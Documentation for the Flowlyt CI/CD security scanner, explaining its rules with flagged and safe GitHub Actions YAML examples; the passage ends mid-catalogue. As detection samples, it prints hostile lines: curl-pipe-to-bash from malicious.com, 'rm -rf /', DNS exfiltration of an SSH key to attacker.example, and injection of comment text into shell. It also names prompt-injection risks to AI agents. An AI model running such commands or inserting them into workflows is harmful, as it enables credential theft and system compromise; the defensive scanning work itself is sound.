# Security Rules Engine

Flowlyt's security rules engine is the core component that analyzes CI/CD workflows to detect security vulnerabilities, misconfigurations, and malicious patterns.

## Overview

The rules engine provides:
- **110+ built-in security rules** covering common CI/CD threats
- **Configurable rule management** (enable/disable specific rules)
- **Severity-based filtering** (CRITICAL, HIGH, MEDIUM, LOW, INFO)
- **Platform-specific adaptations** for GitHub Actions and GitLab CI/CD
- **Dependabot configuration auditing** as a first-class input type
- **Extensible architecture** for custom rule development

> **Note on severity filtering:** the default `--min-severity` is `LOW`, so
> `INFO`-severity hygiene rules (`ANONYMOUS_DEFINITION`,
> `UNDOCUMENTED_PERMISSIONS`) are hidden unless you pass `--min-severity INFO`.

> **Note on online rules:** `REF_VERSION_MISMATCH`, `ARCHIVED_ACTION_SOURCE`,
> and `STALE_ACTION_REFS` query the GitHub API. When a reference cannot be
> resolved (private repository, deleted tag, or rate limiting) the rule skips it
> rather than reporting an unverified finding. Authenticate with
> `--github-token $(gh auth token)` for a higher rate limit.

## Built-in Security Rules

### Critical Severity Rules

#### `HARDCODED_SECRET`
**What it detects:** Hardcoded secrets, API keys, tokens, and credentials in workflow files.

**Why it's critical:** Exposed secrets can lead to unauthorized access to systems, data breaches, and supply chain attacks.

**Examples:**
```yaml
# ❌ CRITICAL: Hardcoded secret
env:
  API_KEY: "sk-1234567890abcdef"
  DATABASE_PASSWORD: "super_secret_password"
  GITHUB_TOKEN: "ghp_xxxxxxxxxxxxxxxxxxxx"

# ✅ GOOD: Using secrets
env:
  API_KEY: ${{ secrets.API_KEY }}
  DATABASE_PASSWORD: ${{ secrets.DB_PASSWORD }}
  GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

**Remediation:**
- Use CI/CD platform's secret management (GitHub Secrets, GitLab Variables)
- Store sensitive data in external secret management systems
- Never commit secrets to version control

#### `MALICIOUS_BASE64_DECODE`
**What it detects:** Base64 decode operations that might be used to obfuscate malicious commands.

**Why it's critical:** Attackers often use base64 encoding to hide malicious payloads and bypass static analysis.

**Examples:**
```yaml
# ❌ CRITICAL: Suspicious base64 decode
run: |
  echo "ZWNobyAiaGVsbG8gd29ybGQi" | base64 -d | bash
  echo $ENCODED_COMMAND | base64 --decode | sh

# ✅ GOOD: Legitimate base64 usage
run: |
  echo "config data" | base64 > config.b64
  kubectl create secret generic mysecret --from-literal=config="$(echo 'data' | base64)"
```

**Remediation:**
- Avoid base64 encoding/decoding in CI/CD scripts
- Use plain text commands for transparency
- If base64 is necessary, document the purpose clearly

### High Severity Rules

#### `INSECURE_PULL_REQUEST_TARGET`
**What it detects:** Usage of `pull_request_target` trigger in GitHub Actions, which can be dangerous.

**Why it's high risk:** `pull_request_target` runs with write permissions and can be exploited by malicious pull requests.

**Examples:**
```yaml
# ❌ HIGH RISK: Dangerous trigger
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Dangerous!

# ✅ SAFER: Use pull_request instead
on:
  pull_request:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
```

**Remediation:**
- Use `pull_request` instead of `pull_request_target` when possible
- If `pull_request_target` is necessary, avoid checking out PR code
- Implement proper approval workflows for external contributions

#### `BROAD_PERMISSIONS`
**What it detects:** Overly broad permissions in GitHub Actions workflows.

**Why it's high risk:** Excessive permissions violate the principle of least privilege and increase attack surface.

**Examples:**
```yaml
# ❌ HIGH RISK: Overly broad permissions
permissions: write-all

# ❌ HIGH RISK: Too many permissions
permissions:
  contents: write
  packages: write
  issues: write
  pull-requests: write
  deployments: write

# ✅ GOOD: Minimal permissions
permissions:
  contents: read
  packages: read

# ✅ GOOD: Specific permissions only
permissions:
  contents: read
  packages: write  # Only what's needed for this job
```

**Remediation:**
- Follow principle of least privilege
- Grant only the minimum permissions required
- Use job-level permissions instead of workflow-level when possible

#### `DANGEROUS_COMMAND`
**What it detects:** Potentially dangerous shell commands that could be exploited.

**Why it's high risk:** Dangerous commands can lead to system compromise, data exfiltration, or supply chain attacks.

**Examples:**
```yaml
# ❌ HIGH RISK: Dangerous commands
run: |
  curl -s https://malicious.com/script.sh | bash
  wget -O - https://install.sh | sh
  eval "$UNTRUSTED_INPUT"
  rm -rf /
  chmod 777 /etc/passwd

# ✅ GOOD: Safe alternatives
run: |
  curl -s https://trusted.com/script.sh > script.sh
  sha256sum script.sh | grep expected_hash
  bash script.sh
```

**Remediation:**
- Avoid piping downloads directly to shell interpreters
- Verify integrity of downloaded files
- Use specific commands instead of dangerous operations

#### `SHELL_EVAL_USAGE`
**What it detects:** Usage of `eval` in shell commands, which can execute arbitrary code.

**Why it's high risk:** `eval` can execute untrusted input as code, leading to command injection.

**Examples:**
```yaml
# ❌ HIGH RISK: Using eval
run: |
  eval "$USER_INPUT"
  eval "$(curl -s https://api.example.com/command)"

# ✅ GOOD: Direct command execution
run: |
  if [ "$USER_INPUT" = "deploy" ]; then
    ./deploy.sh
  fi
```

**Remediation:**
- Never use `eval` with untrusted input
- Use conditional statements instead
- Validate and sanitize all external input

### Medium Severity Rules

#### `UNPINNED_ACTION`
**What it detects:** GitHub Actions that are not pinned to specific commit SHAs.

**Why it's medium risk:** Unpinned actions can be updated maliciously or introduce breaking changes.

**Examples:**
```yaml
# ❌ MEDIUM RISK: Unpinned actions
steps:
  - uses: actions/checkout@v4           # Version tag
  - uses: actions/setup-node@latest     # Latest tag
  - uses: third-party/action@main       # Branch reference

# ✅ GOOD: Pinned to commit SHA
steps:
  - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608
  - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8
```

**Remediation:**
- Pin all actions to specific commit SHAs
- Use tools like Dependabot to keep actions updated
- For official actions, version tags are acceptable

#### `CONTINUE_ON_ERROR_CRITICAL_JOB`
**What it detects:** Critical jobs that continue execution even when security checks fail.

**Why it's medium risk:** Ignoring security check failures can lead to deployment of vulnerable code.

**Examples:**
```yaml
# ❌ MEDIUM RISK: Ignoring security failures
jobs:
  security-scan:
    runs-on: ubuntu-latest
    continue-on-error: true  # Bad for security jobs
    steps:
      - name: Security Scan
        run: security-scanner

  deploy:
    needs: security-scan
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        run: deploy.sh

# ✅ GOOD: Fail fast on security issues
jobs:
  security-scan:
    runs-on: ubuntu-latest
    # continue-on-error: false (default)
    steps:
      - name: Security Scan
        run: security-scanner

  deploy:
    needs: security-scan
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        run: deploy.sh
```

**Remediation:**
- Remove `continue-on-error: true` from security-critical jobs
- Let security failures block deployment pipeline
- Use conditional deployment based on security scan results

## Supply Chain Integrity Rules

### `REF_VERSION_MISMATCH`
**Severity:** HIGH · **Requires network access**

**What it detects:** A SHA-pinned action whose trailing version comment does not
match the commit that version tag actually points to.

**Why it's high risk:** Pinning by commit SHA is the correct defence against tag
mutation, but reviewers rely almost entirely on the adjacent `# v1.2.3` comment
to judge *what* is being pinned. A mismatch is a potent social-engineering
vector: a pull request can point at an attacker-controlled commit while
displaying a trusted version number. The same mismatch also arises benignly when
a version bump updates the comment but not the SHA, silently leaving the
workflow on old and potentially vulnerable code.

**Examples:**
```yaml
# ❌ HIGH RISK: the SHA is actually v4.2.2, not v5.0.0
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v5.0.0

# ✅ GOOD: comment matches the pinned commit
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

**Remediation:**
- Verify which version you intended, then repin to the correct commit or correct the comment
- Use a tool such as Dependabot or `pinact` to keep SHA and comment in sync

### `UNPINNED_CONTAINER_IMAGE`
**Severity:** MEDIUM (untagged / `latest`) or LOW (version tag)

**What it detects:** Job `container:` images, `services:` images, and
`uses: docker://` step references that are not pinned to an immutable digest.

**Why it's a risk:** A mutable tag such as `node:18` can be repointed at
different content by whoever controls the registry namespace. A compromised or
hijacked upstream image then executes inside the job with access to its secrets
and source tree. Only a `@sha256:` digest makes the image immutable.

**Examples:**
```yaml
# ❌ MEDIUM: floating tag
container:
  image: node:latest

# ❌ LOW: version tag is still mutable
services:
  postgres:
    image: postgres:15

# ✅ GOOD: digest-pinned
container:
  image: node@sha256:8e5f2a5a1d2f9c7b6a4e3d2c1b0a9f8e7d6c5b4a3928170695847362514fa0b1
```

**Remediation:**
- Pin images by digest; resolve one with `docker buildx imagetools inspect <image>`

**Notes:** registry ports (`registry.example.com:5000/app`) are correctly
distinguished from tags, and images resolved from `${{ }}` expressions are
skipped as they cannot be evaluated statically.

### `ARCHIVED_ACTION_SOURCE`
**Severity:** MEDIUM · **Requires network access**

**What it detects:** Actions and reusable workflows sourced from archived GitHub
repositories.

**Why it's a risk:** Archiving makes a repository read-only and signals it is
unmaintained. Any vulnerability found in the action can never be patched, and
vendored dependencies inside it continue to age.

**Remediation:**
- Replace with a maintained alternative, or inline the behaviour in a `run:` step
  (many wrapper actions can be replaced by a `gh` CLI call)

### `ADHOC_PACKAGE_INSTALL`
**Severity:** LOW

**What it detects:** `run:` steps installing dependencies ad hoc rather than from
a committed lockfile (`npm`, `pnpm`, `yarn`, `gem`, `pip`, `bundle`).

**Why it's a risk:** An unpinned ad-hoc install resolves to whatever version the
registry serves at that moment, so a compromised release published minutes
earlier is pulled in automatically. Even a version-pinned ad-hoc install leaves
the package's transitive dependencies floating — the layer most commonly
targeted in registry compromises.

**Examples:**
```yaml
# ❌ LOW: ad-hoc install, versions unpinned
- run: npm install left-pad
- run: gem install rake

# ✅ GOOD: lockfile-driven
- run: npm ci
- run: bundle install
- run: pip install -r requirements.txt
```

**Remediation:**
- Add the package to a manifest, commit the lockfile, install via `npm ci`,
  `bundle install`, `pnpm install --frozen-lockfile`, etc.

**Notes:** a bare `npm install` (no package argument) is manifest-driven and is
not flagged. Global installs are handled by `UNPINNED_TOOL_INSTALL` instead, so a
single command is never reported twice.

### `UNPINNED_TOOL_INSTALL`
**Severity:** MEDIUM

**What it detects:** Developer tools installed without a version constraint via
`go install`, `cargo install`, `pipx install`, or `npm install -g`.

**Why it's a risk:** The workflow silently adopts whatever version the registry
publishes next. A compromised tool release executes with full access to the
job's secrets and source tree the moment it is published, with no change to the
repository to review.

**Examples:**
```yaml
# ❌ MEDIUM: floating version
- run: go install github.com/foo/bar@latest
- run: cargo install cargo-audit
- run: npm install -g typescript

# ✅ GOOD: pinned
- run: go install github.com/foo/bar@v1.2.3
- run: cargo install cargo-audit --version 0.18.3 --locked
- run: npm install -g typescript@5.4.5
```

**Remediation:**
- Pin every tool to an exact version; prefer `--locked` for `cargo install`

## Credential Scope Rules

### `HARDCODED_CONTAINER_CREDENTIALS`
**Severity:** CRITICAL

**What it detects:** A literal registry password in a job's `container.credentials`
or `services.<name>.credentials` block.

**Why it's critical:** Credentials committed into a workflow are visible to
everyone with read access, are captured in git history permanently, and are
exposed to every fork. Because they authenticate to a container registry,
leaking them typically permits pushing malicious images that later run in CI.

**Examples:**
```yaml
# ❌ CRITICAL
container:
  image: ghcr.io/team/app:1.0
  credentials:
    username: ci-bot
    password: hunter2supersecret

# ✅ GOOD
container:
  image: ghcr.io/team/app:1.0
  credentials:
    username: ci-bot
    password: ${{ secrets.REGISTRY_PASSWORD }}
```

**Remediation:**
- Move the password to a secret and **rotate the exposed credential**, since it
  remains recoverable from git history

**Notes:** the credential value is redacted in report output. A username alone is
not treated as a secret.

### `SECRETS_OUTSIDE_ENV`
**Severity:** MEDIUM

**What it detects:** `${{ secrets.X }}` interpolated directly into a `run:`
script instead of being passed through the step's `env:` block.

**Why it's a risk:** The expression is substituted into the script text *before*
the shell sees it. The secret's literal value becomes part of the command line,
where it can surface in process listings, shell traces (`set -x`), and error
messages echoing the failing command — GitHub's log redaction does not reliably
cover values mangled by shell processing. If the secret contains shell
metacharacters, the substituted text is also parsed as code.

**Examples:**
```yaml
# ❌ MEDIUM
- run: ./deploy.sh --token ${{ secrets.DEPLOY_TOKEN }}

# ✅ GOOD
- run: ./deploy.sh --token "$DEPLOY_TOKEN"
  env:
    DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
```

**Notes:** `secrets.GITHUB_TOKEN` is exempt, as it is conventionally passed
inline to the `gh` CLI.

### `GITHUB_APP_TOKEN_MISUSE`
**Severity:** MEDIUM, or HIGH for owner-wide tokens

**What it detects:** Over-scoped GitHub App installation tokens requested via
`actions/create-github-app-token` and equivalents. Three distinct issues:

| Condition | Severity | Impact |
|-----------|----------|--------|
| `skip-token-revoke: true` | MEDIUM | Credential stays valid after the job ends |
| `owner:` without `repositories:` | HIGH | Token reaches every repo in the installation |
| No `permission-*` inputs | MEDIUM | Token carries every permission the App was granted |

**Why it's a risk:** App tokens are a legitimate and often preferable alternative
to `GITHUB_TOKEN`, so their use is not itself a finding — the risk is in how they
are requested.

**Examples:**
```yaml
# ❌ HIGH: org-wide token, all permissions, never revoked
- uses: actions/create-github-app-token@v1
  with:
    app-id: ${{ vars.APP_ID }}
    private-key: ${{ secrets.APP_KEY }}
    owner: my-org
    skip-token-revoke: true

# ✅ GOOD: narrowed to one repo and one permission
- uses: actions/create-github-app-token@v1
  with:
    app-id: ${{ vars.APP_ID }}
    private-key: ${{ secrets.APP_KEY }}
    owner: my-org
    repositories: just-this-one
    permission-contents: read
```

## Network and Configuration Hygiene Rules

### `INSECURE_URL_SCHEME`
**Severity:** MEDIUM

**What it detects:** Plaintext `http://` URLs in `run:` commands, action inputs,
and `env:` values at workflow, job, and step level.

**Why it's a risk:** Fetching build inputs, installers, or scripts over
unauthenticated HTTP lets a network-positioned attacker tamper with the response
and achieve code execution on the runner — especially severe in CI, where fetched
content is usually executed or built without further verification.

**Examples:**
```yaml
# ❌ MEDIUM
- run: curl -sSL http://downloads.example.org/install.sh | bash

# ✅ GOOD
- run: |
    curl -sSL https://downloads.example.org/install.sh -o install.sh
    echo "<sha256>  install.sh" | sha256sum -c
    bash install.sh
```

**Notes:** loopback and link-local hosts (`localhost`, `127.0.0.1`, `::1`,
`169.254.169.254`, `*.local`) and well-known namespace/licence identifiers
(`http://www.w3.org/...`, `http://maven.apache.org/...`) are excluded, as they
are never dereferenced over the network.

### `CONCURRENCY_LIMITS_MISSING`
**Severity:** LOW

**What it detects:** Workflows reachable by `push`, `pull_request`, or
`pull_request_target` that do not cancel superseded runs.

**Why it's a risk:** By default every trigger runs to completion even when a
newer run fully supersedes it. On externally triggerable events this lets an
attacker burn runner minutes — a real cost on billed or self-hosted runners — by
pushing repeatedly. It also introduces race conditions for logic that locates
artifacts by workflow/job name rather than run ID.

**Examples:**
```yaml
# ❌ LOW: no concurrency block
on: push

# ❌ LOW: shorthand form is equivalent to cancel-in-progress: false
concurrency: ci-group

# ✅ GOOD
concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: true
```

**Notes:** schedule-only and `workflow_dispatch`-only workflows are out of scope.
A job-level `concurrency` block that cancels satisfies the rule. An expression
value for `cancel-in-progress` is treated as a deliberate choice and accepted.

### `MISFEATURE`
**Severity:** LOW–MEDIUM

**What it detects:** Permitted but hazardous platform features:
`actions/checkout` with `submodules` or `ssh-key`, and `secrets: inherit` on a
reusable workflow call.

**Why it's a risk:** Each has legitimate uses and none is inherently a
vulnerability, but each meaningfully widens the blast radius of a compromise and
is easy to enable without appreciating the consequences.

**Examples:**
```yaml
# ❌ forwards every secret the caller holds
jobs:
  call:
    uses: ./.github/workflows/reusable.yml
    secrets: inherit

# ✅ forwards only what is needed
jobs:
  call:
    uses: ./.github/workflows/reusable.yml
    secrets:
      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

### `ANONYMOUS_DEFINITION`
**Severity:** INFO — *hidden at the default `--min-severity LOW`*

**What it detects:** A workflow with no top-level `name:`.

**Why it matters:** No direct security impact. An unnamed workflow is rendered by
its filename in the Actions UI and required-status settings, making it harder to
tell which workflow produced a run — an obstacle during incident response, and a
condition an attacker adding a lookalike workflow benefits from.

### `UNDOCUMENTED_PERMISSIONS`
**Severity:** INFO — *hidden at the default `--min-severity LOW`*

**What it detects:** A `write` permission scope granted with no explanatory
comment.

**Why it matters:** Write scopes are the credentials an attacker inherits if any
step is compromised, and they are routinely copied between workflows without
anyone rechecking whether they are still needed. A brief comment keeps the
justification next to the grant.

**Examples:**
```yaml
# ❌ INFO: no rationale
permissions:
  contents: write

# ✅ GOOD
permissions:
  contents: write # needed to push release tags
```

**Notes:** read-only scopes and `permissions: {}` are never reported, as neither
confers meaningful authority.

### `FORBIDDEN_USES`
**Severity:** HIGH · **Opt-in — does nothing until configured**

**What it detects:** Actions violating a configured allowlist or denylist. See
[Configuration → Forbidden Uses Policy](configuration.md#forbidden-uses-policy).

**Why it's useful:** Lets an organization mechanically enforce which third-party
actions may appear in its workflows.

```yaml
# .flowlyt.yml — allowlist mode (stricter)
rules:
  forbidden_uses:
    allow:
      - actions/*
      - github/codeql-action
```

**Limitations:** this inspects `uses:` clauses *as written*. It cannot see
actions pulled in indirectly — via `git clone` in a `run:` step, or by a
permitted action that itself calls a forbidden one — so it complements rather
than replaces the other supply chain rules.

## Dependabot Configuration Rules

Flowlyt audits `.github/dependabot.yml` as a distinct input type with its own
schema and rule set. Discovery is automatic for both local and `--url` scans;
pass `--no-dependabot` to skip it. A repository with no Dependabot configuration
is a normal state and produces no findings.

### `DEPENDABOT_COOLDOWN_MISSING`
**Severity:** MEDIUM

**What it detects:** An `updates:` entry with no `cooldown`, or one shorter than
the recommended minimum of **7 days**.

**Why it's a risk:** Package compromises are usually opportunistic — the attacker
expects the malicious version to be yanked quickly, so the exposure window is
short. A repository that updates immediately is precisely the target such an
attack captures; one with a cooldown never sees the release at all. New releases
also carry the highest chance of regressions.

**Examples:**
```yaml
# ❌ MEDIUM: no cooldown
version: 2
updates:
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "daily"

# ✅ GOOD
version: 2
updates:
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "daily"
    cooldown:
      default-days: 7
```

**Notes:** each ecosystem entry is evaluated independently.

### `DEPENDABOT_INSECURE_EXECUTION`
**Severity:** HIGH

**What it detects:** `insecure-external-code-execution: allow` in an `updates:`
entry.

**Why it's high risk:** Several ecosystems execute manifest code while resolving
dependencies; Dependabot disables this by default. Re-enabling it means a
compromised dependency gains code execution inside a Dependabot job, which holds
the credentials needed to read the repository and reach configured private
registries — triggered automatically, with no human in the loop.

**Examples:**
```yaml
# ❌ HIGH
- package-ecosystem: "bundler"
  directory: "/"
  schedule:
    interval: "daily"
  insecure-external-code-execution: allow

# ✅ GOOD — or simply omit the key to rely on the secure default
  insecure-external-code-execution: deny
```

## Covert Channel and Indirect Injection Rules

These rules cover techniques that evade the direct-interpolation and
network-upload checks. Each is deliberately narrow: a broad pattern in this
space fires on ordinary build scripts, and an exfiltration rule that cries wolf
is worse than no rule at all.

### `DNS_EXFILTRATION`
**Severity:** HIGH

**What it detects:** Data encoded into a DNS query — a hostname built by command
substitution, a workflow expression used as a subdomain label, or a
DNS-over-HTTPS resolver carrying an expression.

**Why it's high risk:** The data never travels over an obvious upload. It leaves
inside the query name itself, over a protocol that egress filtering and network
monitoring rarely inspect and almost never block.

```yaml
# ❌ HIGH: the SSH key leaves inside the query name
- run: nslookup "$(cat ~/.ssh/id_rsa | base64 -w0).attacker.example"

# ❌ HIGH: secret used as a subdomain label
- run: curl "https://${{ secrets.TOKEN }}.collector.example/x"

# ✅ Ordinary resolution is not reported
- run: nslookup github.com
```

### `STEGANOGRAPHIC_EXFILTRATION`
**Severity:** MEDIUM

**What it detects:** Embedding tools (`steghide embed`, `outguess`, `stegosuite`,
`cloakify`), and writes of an expression or command output into large image
metadata fields via `exiftool`.

**Why it's a risk:** The payload is carried inside a file that looks innocuous,
so it survives artifact upload and human review without appearing sensitive.

**Notes:** reading metadata (`exiftool -Comment out.png`) and ordinary image
processing (`convert`, `magick`) are not reported.

### `COVERT_CHANNEL_EXFILTRATION`
**Severity:** MEDIUM

**What it detects:** ICMP packets with an explicit hex payload, sleep durations
computed from untrusted input, and transfer sizes derived from an expression.

**Why it's a risk:** Data leaks through a side channel — packet contents, job
duration, or bytes transferred — rather than through anything resembling an
upload, so it is invisible to content inspection.

**Notes:** plain `ping`, `sleep 30`, and fixed-count `dd` are not reported.

### `HEREDOC_INJECTION`
**Severity:** HIGH

**What it detects:** An **unquoted** heredoc whose body interpolates a workflow
expression.

**Why it's high risk:** The shell expands the body before writing it, so
attacker-controlled text is evaluated. Because the expression and the execution
sit on different lines, rules that look for interpolation next to a command miss
it entirely.

```yaml
# ❌ HIGH: body is expanded by the shell
- run: |
    cat <<EOF > /tmp/s.sh
    ${{ github.event.comment.body }}
    EOF

# ✅ Quoting the delimiter takes the body literally
- run: |
    cat <<'EOF' > /tmp/s.sh
    ${{ github.event.comment.body }}
    EOF
```

### `MULTI_STAGE_INJECTION`
**Severity:** HIGH

**What it detects:** A workflow expression written into a file that is later
executed — in the same `run:` block, to the **same path**.

**Why it's high risk:** Splitting the write from the execution defeats rules
that expect both on one line, but the outcome is identical: attacker-controlled
text runs as code.

```yaml
# ❌ HIGH: untrusted text written to a script that is then run
- run: |
    echo "${{ github.event.comment.body }}" > /tmp/p.sh
    bash /tmp/p.sh

# ✅ Writing a log and running an unrelated script is not reported
- run: |
    echo "${{ github.event.head_commit.message }}" > /tmp/commit.log
    bash ./scripts/build.sh
```

**Notes:** requiring the same path is what keeps this precise — path
normalisation treats `> run.sh` and `./run.sh` as the same file.

## Cross-Job Data Flow Rules

### `CROSS_JOB_TAINT`
**Severity:** CRITICAL

**What it detects:** Attacker-controlled data written into a job output by one
job, then executed by a dependent job.

**Why it's critical:** Every other rule examines a single step or a single job.
This attack shape is invisible to all of them, because **neither job is
dangerous on its own**:

- The first job only reads an issue title into an output. Reading untrusted
  input is not itself a vulnerability.
- The second job only echoes a value from `needs`. Consuming an upstream output
  is not itself a vulnerability.

The vulnerability exists solely in the edge between them. It is frequently the
privileged job that consumes the value, because the pattern is often used
deliberately to move data from an unprivileged collector into a job holding
write permissions or secrets.

**Examples:**
```yaml
# ❌ CRITICAL: the issue title becomes shell code in a privileged job
jobs:
  collect:
    runs-on: ubuntu-latest
    outputs:
      title: ${{ steps.grab.outputs.title }}
    steps:
      - id: grab
        run: echo "title=${{ github.event.issue.title }}" >> $GITHUB_OUTPUT

  publish:
    needs: [collect]
    permissions:
      contents: write
    steps:
      - run: echo "${{ needs.collect.outputs.title }}"

# ✅ GOOD: the value is passed through env and quoted, never parsed as code
  publish:
    needs: [collect]
    steps:
      - run: echo "$TITLE"
        env:
          TITLE: ${{ needs.collect.outputs.title }}
```

**How it works:** jobs form a directed acyclic graph through `needs:`, and data
flows only from a dependency to its dependents. The analyzer sorts jobs
topologically (Kahn's algorithm) and propagates taint in that order, which
guarantees every input to a job is resolved before the job is examined — so a
single pass suffices with no iteration to a fixpoint. Cycles are detected and
skipped: GitHub rejects them, and the analyzer must terminate rather than loop.

Taint is traced through arbitrarily long chains, so a value laundered through
intermediate forwarding jobs is still reported, with the full path shown
(`collect → forward → publish`).

**What is deliberately not reported:**

- Trusted contexts such as `github.sha`, `github.repository`, or
  `github.event.repository.name` — only known attacker-controllable contexts
  taint.
- Values passed via `env:` and referenced as shell variables, which is the
  recommended fix.
- Tainted outputs that no downstream job consumes.
- Flows confined to a single job, which the per-step injection rules already
  cover.

**Known limitation:** taint passing *through a third-party action* that sets an
output is not tracked, because the action's own definition is not resolved.
Composite action resolution would close this gap.

### `CROSS_FILE_TAINT`
**Severity:** CRITICAL

**What it detects:** Attacker-controlled data passed into a **local** composite
action or reusable workflow that executes it.

**Why it's critical:** Analysis that stops at the file boundary cannot see this.
The calling workflow looks clean — it only passes a parameter. The callee looks
clean — it only uses its own declared input. The vulnerability is the
composition of the two, and it is invisible to any rule that reads one file at a
time.

**Examples:**
```yaml
# .github/actions/greet/action.yml  — looks fine, uses its own input
inputs:
  message:
    description: message to display
runs:
  using: composite
  steps:
    - run: echo "${{ inputs.message }}"
      shell: bash

# .github/workflows/ci.yml  — looks fine, just passes a parameter
on: issue_comment
jobs:
  greet:
    steps:
      - uses: ./.github/actions/greet
        with:
          message: ${{ github.event.comment.body }}   # ❌ becomes shell code
```

Findings name both sides: the caller line, the untrusted source, the resolved
file, and the line **inside that file** where execution happens.

**Scope and limits:**

- Only **repository-local** targets (`./...`) are resolved. A remote action
  would require fetching another repository — a network operation with its own
  trust questions — which the supply chain rules cover instead.
- Only **composite** actions are followed. JavaScript and Docker actions execute
  code that is not readable from the manifest.
- Only inputs that reach an **execution sink** are reported. An input used as an
  artifact name is not flagged.
- `uses:` values are treated as untrusted repository data: a reference such as
  `./../../etc` is refused rather than followed, so the analyzer cannot be
  induced to read files outside the repository.

## Complete Rule Catalogue

Every rule Flowlyt can emit, grouped by category and ordered by severity. The
sections above give in-depth explanations and remediation guidance for the most
commonly encountered rules; this catalogue is the exhaustive reference.

**Legend**

| Marker | Meaning |
|--------|---------|
| 🌐 | Requires GitHub API access. Unresolvable references are skipped, never reported as findings. |
| † | Emitted by an aggregate check rather than registered individually. These cannot be toggled by ID via `--enable-rules` / `--disable-rules`; disable the parent rule instead. |

#### Injection & Untrusted Input

| Rule ID | Severity | Detects |
|---------|----------|---------|
| `CREDENTIAL_EXFILTRATION` | CRITICAL | Detects patterns that could lead to secret or credential theft |
| `CROSS_FILE_TAINT` | CRITICAL | Attacker-controlled data is passed into a local composite action or reusable workflow that executes it |
| `CROSS_JOB_TAINT` | CRITICAL | Attacker-controlled data is written to a job output and executed by a dependent job |
| `DANGEROUS_WRITE_OPERATION` | CRITICAL | Detects dangerous write operations on $GITHUB_OUTPUT or $GITHUB_ENV that could lead to command injection |
| `GITHUB_ENV_UNTRUSTED_WRITE` | CRITICAL | User-controlled data written to $GITHUB_ENV enables arbitrary env-var injection into subsequent steps |
| `INJECTION_VULNERABILITY` | CRITICAL | Detects injection vulnerabilities where user-controlled input is directly interpolated into commands |
| `MEMDUMP_EXFILTRATION_SIGNATURE` | CRITICAL | Detects memdump.py and similar process-memory exfiltration tools used to steal runner secrets |
| `PR_TARGET_ABUSE` | CRITICAL | Detects dangerous usage of pull_request_target trigger with write permissions |
| `PULL_REQUEST_TARGET_EXECUTION_RISK` † | CRITICAL | pull_request_target workflow executes untrusted code from pull request |
| `SCRIPT_INJECTION` | CRITICAL | Detects script injection vulnerabilities in github-script actions and PowerShell scripts |
| `SELF_HOSTED_RUNNER_UNTRUSTED_CODE` † | CRITICAL | Self-hosted runner executes potentially untrusted user input, creating code injection risk |
| `SHELL_INJECTION` | CRITICAL | Detects shell injection vulnerabilities where user input is executed directly in shell context |
| `UNTRUSTED_CHECKOUT_EXECUTION` | CRITICAL | Detects execution of commands after checking out untrusted code that could contain malicious scripts |
| `HEREDOC_INJECTION` | HIGH | An unquoted heredoc interpolates a workflow expression, so attacker-controlled text is expanded by the shell inside the document body |
| `INDIRECT_PPE_BUILD_TOOL` | HIGH | Workflow checks out untrusted PR code and runs a build tool that processes attacker-controlled manifests |
| `MATRIX_INJECTION` | HIGH | Detects injection vulnerabilities through matrix strategy inputs |
| `MULTI_STAGE_INJECTION` | HIGH | A workflow expression is written to a file that is subsequently executed, so attacker-controlled text runs as code |
| `UNSOUND_CONDITION` | HIGH | Detects logic vulnerabilities in workflow conditional statements |
| `UNSOUND_CONTAINS` | HIGH | Detects vulnerable contains() expressions that can be bypassed |
| `DEBUG_JS_EXECUTION` | MEDIUM | Detects workflows that execute system commands in JavaScript scripts |

#### Secret & Credential Exposure

| Rule ID | Severity | Detects |
|---------|----------|---------|
| `DOCKER_EXEC_WITH_SECRETS_ON_FORK_CODE` | CRITICAL | A pull_request_target workflow runs a Docker container or reusable agent workflow with secrets forwarded while processing fork code without network isolation |
| `HARDCODED_CONTAINER_CREDENTIALS` | CRITICAL | Container registry password is hardcoded in the workflow instead of being sourced from a secret |
| `HARDCODED_SECRET` | CRITICAL | Detects potential secrets hardcoded in workflow files |
| `SERVICES_CREDENTIALS` | CRITICAL | Detects hardcoded credentials in services configuration |
| `UNREDACTED_SECRETS` | CRITICAL | Detects secrets that may be logged in plaintext during execution |
| `AI_AGENT_COMMENT_TRIGGERED` | HIGH | An AI agent runs in response to issue/PR comments from any user without author_association gating, enabling prompt injection (with secrets) or denial-of-wallet (without secrets) attacks |
| `AI_AGENT_ON_UNTRUSTED_CODE` | HIGH | An AI agent/bot processes fork-controlled code in a pull_request_target workflow with secrets available, enabling indirect prompt injection to exfiltrate secrets |
| `PUBLIC_REPO_SELF_HOSTED_SECRETS` † | HIGH | Self-hosted runner in public repository has access to secrets, creating potential exposure risk |
| `SECRETS_INHERIT` | HIGH | Detects insecure secret inheritance patterns in reusable workflows |
| `SECRETS_TO_UNTRUSTED_ACTION` † | HIGH | Secrets are being passed to an action from an untrusted source |
| `SELF_HOSTED_RUNNER_SECRETS_IN_RUN` † | HIGH | Secrets are directly used in run commands on self-hosted runner, potentially exposing them in process lists or logs |
| `OVERPROVISIONED_SECRETS` | MEDIUM | Detects workflows with excessive secret access beyond requirements |
| `SECRETS_OUTSIDE_ENV` | MEDIUM | Secret is substituted directly into a run script instead of being passed through env, exposing it to the command line |
| `SECRET_IN_ENVIRONMENT` † | MEDIUM | Secret is directly exposed in environment variable, which may be logged or visible |

#### Supply Chain

| Rule ID | Severity | Detects |
|---------|----------|---------|
| `IMPOSTOR_COMMIT` | CRITICAL | Detects commits that may be impersonating legitimate authors |
